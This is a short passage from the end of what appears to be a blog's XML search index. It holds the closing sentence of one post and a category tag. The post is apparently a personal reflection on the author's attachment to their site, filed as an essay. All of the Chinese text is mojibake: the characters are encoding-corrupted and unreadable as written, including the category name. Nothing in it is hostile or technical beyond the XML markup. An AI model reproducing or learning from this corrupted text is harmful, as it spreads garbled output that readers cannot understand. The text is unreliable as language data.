ã€ä¸ç«™ç‚¹ç›¸ä¼´çš„çƒ­çˆ±ï¼Œä¹Ÿä¼šç»§ç»­é™ªæˆ‘èµ°ä¸‹å»ï¼Œæœªæ¥è¿˜æœ‰æ›´å¤šå¯èƒ½ï¼Œç­‰å¾…è¢«æ¢ç´¢ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>éšç¬”</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
